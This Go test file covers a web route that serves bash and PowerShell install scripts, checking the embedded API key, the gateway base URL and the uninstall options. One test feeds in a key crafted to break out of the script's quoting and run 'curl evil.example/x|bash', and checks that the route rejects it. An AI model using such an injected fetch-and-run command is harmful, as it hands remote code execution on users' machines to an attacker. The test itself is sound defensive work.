package routes

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
)

func newInstallScriptRouter() *gin.Engine {
	gin.SetMode(gin.TestMode)
	r := gin.New()
	RegisterInstallScriptRoutes(r)
	return r
}

func doInstallRequest(t *testing.T, target string, headers map[string]string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, target, nil)
	for name, value := range headers {
		req.Header.Set(name, value)
	}
	w := httptest.NewRecorder()
	newInstallScriptRouter().ServeHTTP(w, req)
	return w
}

func TestInstallShellScriptEmbedsKeyAndBaseURL(t *testing.T) {
	w := doInstallRequest(t, "/install.sh?key=sk-install-test", map[string]string{
		"X-Forwarded-Proto": "https",
	})

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "API_KEY='sk-install-test'") {
		t.Fatalf("script does not carry the api key: %s", body)
	}
	if !strings.Contains(body, "BASE_URL='https://example.com'") {
		t.Fatalf("script does not carry the gateway base url: %s", body)
	}
	for _, want := range []string{
		"ANTHROPIC_BASE_URL",
		"ANTHROPIC_AUTH_TOKEN",
		"--uninstall",
	} {
		if !strings.Contains(body, want) {
			t.Fatalf("script missing %q", want)
		}
	}
	if ct := w.Header().Get("Content-Type"); !strings.Contains(ct, "shellscript") {
		t.Fatalf("unexpected content type: %s", ct)
	}
	if cc := w.Header().Get("Cache-Control"); cc != "no-store" {
		t.Fatalf("expected no-store cache control, got %q", cc)
	}
}

func TestInstallPowerShellScriptEmbedsKeyAndBaseURL(t *testing.T) {
	w := doInstallRequest(t, "/install.ps1?key=sk-install-test", map[string]string{
		"X-Forwarded-Proto": "https",
	})

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "$ApiKey   = 'sk-install-test'") {
		t.Fatalf("script does not carry the api key: %s", body)
	}
	if !strings.Contains(body, "$BaseUrl  = 'https://example.com'") {
		t.Fatalf("script does not carry the gateway base url: %s", body)
	}
	if !strings.Contains(body, "param([switch]$Uninstall)") {
		t.Fatalf("script missing uninstall switch: %s", body)
	}
}

func TestInstallScriptRejectsUnsafeKey(t *testing.T) {
	// The key lands inside a script that users pipe into bash/pwsh: anything
	// outside the safe charset must be refused instead of interpolated.
	for _, target := range []string{
		"/install.sh?key=sk-bad%27%3Bcurl+evil.example%2Fx%7Cbash%3B%27",
		"/install.ps1?key=short",
		"/install.sh?key=sk-with%20space",
	} {
		w := doInstallRequest(t, target, nil)
		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400 for %s, got %d (%s)", target, w.Code, w.Body.String())
		}
	}
}

func TestInstallScriptFallsBackToHTTPWithoutProxyHints(t *testing.T) {
	w := doInstallRequest(t, "/install.sh?key=sk-install-test", nil)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "BASE_URL='http://example.com'") {
		t.Fatalf("expected http fallback base url, got: %s", w.Body.String())
	}
}
